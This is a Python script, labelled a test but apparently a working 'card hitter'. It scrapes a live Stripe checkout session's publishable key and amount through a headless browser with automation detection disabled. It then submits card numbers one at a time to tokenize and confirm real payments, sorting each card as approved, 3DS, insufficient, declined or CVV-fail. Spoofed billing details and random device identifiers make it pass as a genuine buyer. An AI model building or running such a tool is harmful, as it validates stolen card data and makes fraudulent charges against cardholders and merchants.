"""
scratch/test_stripe_hosted_hitter.py
COMPLETE TEST — Stripe Hosted Checkout Hitter
Step 1: Playwright (headless, fast) → extract PK from elements/sessions
Step 2: GET /v1/payment_pages/{session_id} → get amount, init_checksum
Step 3: For each card → POST /v1/payment_methods + POST /v1/payment_pages/confirm

Usage:
  python scratch/test_stripe_hosted_hitter.py
  Enter URL, then cards one by one
"""
import asyncio, sys, re, json, random, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

# ─── Config ───────────────────────────────────────────────────────────────────
CHECKOUT_URL = ""   # filled from input
STRIPE_VERSION = "fe3c872f40"  # from captured requests

BASE_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
}

def rand_guid():
    h = "0123456789abcdef"
    base = "-".join(["".join(random.choices(h, k=8)),
                     "".join(random.choices(h, k=4)),
                     "4"+"".join(random.choices(h, k=3)),
                     random.choice("89ab")+"".join(random.choices(h, k=3)),
                     "".join(random.choices(h, k=12))])
    suffix = "".join(random.choices(h, k=6))
    return base + suffix


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Extract PK via lightweight Playwright load
# ═══════════════════════════════════════════════════════════════════════════════
async def extract_session_data(checkout_url: str) -> dict:
    """
    Loads the checkout page headlessly.
    Captures: PK, amount (with tax), init_checksum, merchant name
    All from network responses in one Playwright session.
    """
    from playwright.async_api import async_playwright

    captured = {"pk": None, "amount": None, "init_checksum": "", "merchant": "Unknown"}
    print("  [Playwright] Loading page...")

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-blink-features=AutomationControlled"]
        )
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
        )
        page = await ctx.new_page()

        done_event = asyncio.Event()

        def on_request(request):
            url = request.url
            # Capture PK
            m = re.search(r'[?&]key=(pk_live_[a-zA-Z0-9]+)', url)
            if m and not captured["pk"]:
                captured["pk"] = m.group(1)

        async def on_response(response):
            url = response.url
            # Capture from payment_pages GET response
            if "/v1/payment_pages/" in url and "confirm" not in url:
                try:
                    body = await response.json()
                    ts = body.get("total_summary") or {}
                    amt = ts.get("due") or ts.get("total")
                    if amt and amt > 1000:
                        captured["amount"] = amt
                    ic = body.get("init_checksum")
                    if ic:
                        captured["init_checksum"] = ic
                    name = body.get("statement_descriptor") or body.get("name")
                    if name:
                        captured["merchant"] = name
                    if captured["pk"] and captured["amount"]:
                        done_event.set()
                except Exception:
                    pass
            # Capture from elements/sessions
            elif "elements/sessions" in url:
                try:
                    body = await response.json()
                    name = body.get("business_name")
                    if name:
                        captured["merchant"] = name
                except Exception:
                    pass

        page.on("request", on_request)
        page.on("response", on_response)

        try:
            await page.goto(checkout_url, wait_until="domcontentloaded", timeout=15000)
        except Exception:
            pass

        # Wait up to 10 seconds for all data
        try:
            await asyncio.wait_for(done_event.wait(), timeout=10.0)
        except asyncio.TimeoutError:
            pass  # Use whatever we captured

        await ctx.close()
        await browser.close()

    pk = captured["pk"]
    amt = captured["amount"]
    if pk:
        print(f"  [PK] ✅ {pk[:30]}...")
    else:
        print("  [PK] ❌ Not found")
    if amt:
        rupees = amt / 100
        print(f"  [Amount] ✅ {amt} paise = ₹{rupees:,.2f}")
    else:
        print("  [Amount] ❌ Not captured")
    return captured


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Get Payment Page Data
# ═══════════════════════════════════════════════════════════════════════════════
async def get_page_data(session, session_id: str, pk: str) -> dict | None:
    """GET /v1/payment_pages/{session_id}?key=PK&eid=NA"""
    url = f"https://api.stripe.com/v1/payment_pages/{session_id}?key={pk}&eid=NA"
    try:
        r = await session.get(url, headers=BASE_HEADERS)
        if r.status_code != 200:
            print(f"  [Page] ❌ HTTP {r.status_code}: {r.text[:100]}")
            return None
        data = r.json()

        # Extract key fields
        result = {}

        # Amount (from total_summary)
        ts = data.get("total_summary") or {}
        result["amount"] = ts.get("due") or ts.get("total") or data.get("amount_total", 0)

        # Currency
        result["currency"] = data.get("currency", "usd").upper()

        # Merchant name
        result["merchant"] = data.get("statement_descriptor") or data.get("name") or "Unknown"

        # init_checksum (needed for confirm)
        result["init_checksum"] = data.get("init_checksum", "")

        # Payment mode
        result["mode"] = data.get("mode", "payment")

        # PI or SI
        pi = data.get("payment_intent") or {}
        si = data.get("setup_intent") or {}
        result["pi_id"] = pi.get("id")
        result["pi_secret"] = pi.get("client_secret")
        result["si_id"] = si.get("id")
        result["si_secret"] = si.get("client_secret")

        # site_key (hCaptcha sitekey)
        result["site_key"] = data.get("site_key", "")

        print(f"  [Page] ✅ Amount={result['amount']} {result['currency']} | mode={result['mode']}")
        if result['pi_id']:
            print(f"  [Page] PI={result['pi_id']}")
        if result['si_id']:
            print(f"  [Page] SI={result['si_id']}")
        return result

    except Exception as e:
        print(f"  [Page] ❌ Error: {e}")
        return None


async def update_tax_amount(session, session_id: str, pk: str, page_data: dict) -> int:
    """
    POST /v1/payment_pages/{session_id} with tax_region
    to get the final amount including tax (GST/VAT etc.)
    Returns updated amount (tax-inclusive)
    """
    data = {
        "eid": "NA",
        "tax_region[country]": "IN",
        "tax_region[state]": "DL",
        "tax_region[postal_code]": "110080",
        "tax_region[line1]": "615 Main Road",
        "tax_region[city]": "New Delhi",
        "key": pk,
    }
    try:
        r = await session.post(
            f"https://api.stripe.com/v1/payment_pages/{session_id}",
            headers=BASE_HEADERS, data=data
        )
        if r.status_code == 200:
            resp = r.json()
            ts = resp.get("total_summary") or {}
            new_amount = ts.get("due") or ts.get("total")
            if new_amount and new_amount != page_data["amount"]:
                print(f"  [Tax] ✅ Amount updated: {page_data['amount']} → {new_amount} (tax added)")
                # Also update init_checksum if present
                if resp.get("init_checksum"):
                    page_data["init_checksum"] = resp["init_checksum"]
                return new_amount
            else:
                print(f"  [Tax] Amount unchanged: {page_data['amount']}")
                return page_data["amount"]
        else:
            print(f"  [Tax] ⚠️ POST failed ({r.status_code}), using original amount")
            return page_data["amount"]
    except Exception as e:
        print(f"  [Tax] ⚠️ Error: {e}, using original amount")
        return page_data["amount"]


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Tokenize Card
# ═══════════════════════════════════════════════════════════════════════════════
async def create_pm(session, card: dict, pk: str, session_id: str,
                    client_session_id: str) -> str | None:
    """POST /v1/payment_methods → pm_xxx"""
    # Normalize year
    year = card["year"].strip()
    if len(year) == 4:
        year = year[-2:]

    data = {
        "type": "card",
        "card[number]": card["number"].replace(" ", ""),
        "card[cvc]": card["cvv"],
        "card[exp_month]": card["month"].strip().zfill(2),
        "card[exp_year]": year,
        "billing_details[name]": "John Smith",
        "billing_details[email]": "test@email.com",
        "billing_details[address][country]": "IN",
        "billing_details[address][line1]": "615 Main Road",
        "billing_details[address][city]": "New Delhi",
        "billing_details[address][state]": "DL",
        "billing_details[address][postal_code]": "110080",
        "guid": rand_guid(),
        "muid": rand_guid(),
        "sid": rand_guid(),
        "key": pk,
        "payment_user_agent": f"stripe.js/{STRIPE_VERSION}; stripe-js-v3/{STRIPE_VERSION}; checkout",
        "client_attribution_metadata[client_session_id]": client_session_id,
        "client_attribution_metadata[checkout_session_id]": session_id,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
    }

    try:
        r = await session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=BASE_HEADERS, data=data
        )
        resp = r.json()
        if r.status_code == 200 and resp.get("id"):
            return resp["id"]
        else:
            err = resp.get("error", {})
            msg = err.get("message", "unknown")
            code = err.get("code", "")
            # Card-level errors still tell us card is live
            if "expired" in msg.lower():
                return "EXPIRED"
            if "cvc" in msg.lower() or "security" in msg.lower():
                return "CVV_FAIL"
            if "number" in msg.lower() and "incorrect" in msg.lower():
                return "INVALID_NUMBER"
            print(f"  [PM] Fail: {msg}")
            return None
    except Exception as e:
        print(f"  [PM] Error: {e}")
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Confirm Payment
# ═══════════════════════════════════════════════════════════════════════════════
async def confirm(session, pm_id: str, page_data: dict, pk: str,
                  session_id: str, client_session_id: str) -> dict:
    """POST /v1/payment_pages/{session_id}/confirm"""

    guid = rand_guid()

    data = {
        "eid": "NA",
        "payment_method": pm_id,
        "expected_amount": str(page_data["amount"]),
        "tax_id_collection[purchasing_as_business]": "false",
        "expected_payment_method_type": "card",
        "guid": guid,
        "muid": rand_guid(),
        "sid": rand_guid(),
        "key": pk,
        "version": STRIPE_VERSION,
        "client_attribution_metadata[client_session_id]": client_session_id,
        "client_attribution_metadata[checkout_session_id]": session_id,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        "link_brand": "link",
    }

    # Add init_checksum if we have it
    if page_data.get("init_checksum"):
        data["init_checksum"] = page_data["init_checksum"]

    url = f"https://api.stripe.com/v1/payment_pages/{session_id}/confirm"

    try:
        r = await session.post(url, headers=BASE_HEADERS, data=data)
        resp = r.json()

        status_code = r.status_code

        if status_code == 200:
            # Check for requires_action (3DS)
            pi_data = resp.get("payment_intent") or resp.get("setup_intent") or {}
            status = pi_data.get("status") or resp.get("status")
            if status == "requires_action":
                return {"status": "3DS", "msg": "Requires 3DS Authentication", "code": "3ds", "raw": status_code}
            elif status == "succeeded":
                return {"status": "APPROVED", "msg": "Payment Succeeded!", "code": "", "raw": status_code}
            else:
                return {"status": "APPROVED", "msg": f"Status: {status}", "code": status or "", "raw": status_code}

        elif status_code == 402:
            err = resp.get("error") or {}
            msg = err.get("message", "Declined")
            code = err.get("decline_code") or err.get("code") or "declined"
            msg_lower = msg.lower()

            if "insufficient" in msg_lower:
                return {"status": "INSUFFICIENT", "msg": msg, "code": code, "raw": status_code}
            elif "3d secure" in msg_lower or "authentication" in msg_lower:
                return {"status": "3DS", "msg": msg, "code": code, "raw": status_code}
            else:
                return {"status": "DECLINED", "msg": msg, "code": code, "raw": status_code}

        elif status_code == 400:
            err = resp.get("error") or {}
            msg = err.get("message", str(resp)[:200])
            code = err.get("code", "bad_request")
            return {"status": "ERROR", "msg": msg, "code": code, "raw": status_code}

        else:
            return {"status": "ERROR", "msg": f"HTTP {status_code}: {r.text[:200]}", "code": str(status_code), "raw": status_code}

    except Exception as e:
        return {"status": "ERROR", "msg": str(e), "code": "exception", "raw": 0}


# ═══════════════════════════════════════════════════════════════════════════════
# Check a single card
# ═══════════════════════════════════════════════════════════════════════════════
async def check_card(session, card_str: str, pk: str, session_id: str,
                     page_data: dict) -> dict:
    """Full flow for one card: tokenize + confirm"""
    parts = card_str.strip().split("|")
    if len(parts) != 4:
        return {"status": "ERROR", "msg": "Bad format (use number|mm|yy|cvv)", "code": "format"}

    card = {"number": parts[0].strip().replace(" ", ""),
            "month": parts[1].strip(),
            "year": parts[2].strip(),
            "cvv": parts[3].strip()}

    display = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
    client_session_id = rand_guid()

    t0 = time.time()

    # Tokenize
    pm_id = await create_pm(session, card, pk, session_id, client_session_id)

    if not pm_id:
        return {"status": "ERROR", "msg": "Tokenization failed", "code": "pm_fail", "card": display}
    if pm_id == "EXPIRED":
        return {"status": "EXPIRED", "msg": "Card expired", "code": "expired", "card": display}
    if pm_id == "INVALID_NUMBER":
        return {"status": "DEAD", "msg": "Invalid card number", "code": "incorrect_number", "card": display}
    if pm_id == "CVV_FAIL":
        return {"status": "CVV", "msg": "CVC incorrect", "code": "incorrect_cvc", "card": display}

    # Confirm
    result = await confirm(session, pm_id, page_data, pk, session_id, client_session_id)
    result["card"] = display
    result["time"] = f"{time.time()-t0:.1f}s"
    return result


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════
def status_emoji(s: str) -> str:
    return {
        "APPROVED": "✅", "3DS": "🔐", "INSUFFICIENT": "⚠️",
        "DECLINED": "❌", "DEAD": "❌", "EXPIRED": "❌",
        "CVV": "❌", "ERROR": "❓"
    }.get(s, "❓")


async def main():
    from curl_cffi.requests import AsyncSession

    global CHECKOUT_URL

    print("=" * 65)
    print("  STRIPE HOSTED CHECKOUT HITTER — Complete Test")
    print("=" * 65)

    # Get checkout URL
    url = input("\nCheckout URL (cs_live_...): ").strip().lstrip('\ufeff')
    if "cs_live_" not in url:
        print("❌ Invalid URL")
        return
    CHECKOUT_URL = url

    # Extract session_id
    session_id_m = re.search(r'cs_live_[a-zA-Z0-9]+', url)
    if not session_id_m:
        print("❌ Could not find session ID in URL")
        return
    session_id = session_id_m.group(0)
    print(f"\nSession ID: {session_id[:30]}...")

    # STEP 1: Playwright — capture PK + amount + init_checksum in ONE load
    print("\n[STEP 1] Loading page (capturing PK + amount)...")
    captured = await extract_session_data(url)
    pk = captured.get("pk")
    if not pk:
        print("❌ Cannot proceed without PK")
        return

    async with AsyncSession(impersonate="chrome131") as session:

        # STEP 2: Get page data (mode, currency, PI id etc.)
        print("\n[STEP 2] Getting payment page metadata...")
        page_data = await get_page_data(session, session_id, pk)
        if not page_data:
            print("❌ Cannot get page data")
            return

        # Use Playwright-captured amount (more accurate — from real browser)
        if captured.get("amount"):
            page_data["amount"] = captured["amount"]
            print(f"  Using Playwright amount: {page_data['amount']} ({page_data['currency']})")
        if captured.get("init_checksum"):
            page_data["init_checksum"] = captured["init_checksum"]

        print(f"\n  Merchant : {captured.get('merchant') or page_data.get('merchant', 'Unknown')}")
        print(f"  Amount   : {page_data['amount']} paise = ₹{page_data['amount']/100:,.2f}")
        print(f"  Mode     : {page_data['mode']}")

        # STEP 3: Check cards
        print("\n" + "─" * 65)
        print("  CARD CHECKING (format: number|mm|yy|cvv, 'q' to quit)")
        print("─" * 65)

        results = {"✅": 0, "🔐": 0, "⚠️": 0, "❌": 0, "❓": 0}

        while True:
            try:
                card_input = input("\nCard: ").strip()
                if card_input.lower() in ("q", "quit", "exit", ""):
                    break

                print(f"  Checking {card_input[:6]}xxxxxx{card_input[-4:] if len(card_input) > 4 else ''}...")
                result = await check_card(session, card_input, pk, session_id, page_data)

                emoji = status_emoji(result["status"])
                results[emoji] = results.get(emoji, 0) + 1

                print(f"\n  {emoji} {result['status']}")
                print(f"  Card   : {result.get('card', '?')}")
                print(f"  Message: {result.get('msg', '')}")
                if result.get('code'):
                    print(f"  Code   : {result.get('code', '')}")
                if result.get('time'):
                    print(f"  Time   : {result.get('time', '')}")

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"  ❓ Error: {e}")

        # Summary
        print("\n" + "=" * 65)
        print("  SESSION SUMMARY")
        print("=" * 65)
        for emoji, count in results.items():
            if count > 0:
                print(f"  {emoji} : {count}")
        print("=" * 65)


if __name__ == "__main__":
    asyncio.run(main())
